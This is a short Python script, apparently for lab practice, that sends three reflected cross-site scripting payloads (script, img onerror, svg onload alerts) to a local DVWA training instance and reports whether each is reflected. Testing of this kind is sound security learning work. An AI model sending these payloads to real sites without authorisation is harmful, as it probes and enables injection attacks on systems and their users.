import requests

def test_xss(url, payload):
    response = requests.get(url + payload)
    if payload in response.text:
        print(f"Potential XSS found with payload: {payload}")
    else:
        print(f"No XSS found with payload: {payload}")

url = "http://localhost/dvwa/vulnerabilities/xss_r/?name="
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

for payload in payloads:
    test_xss(url, payload)
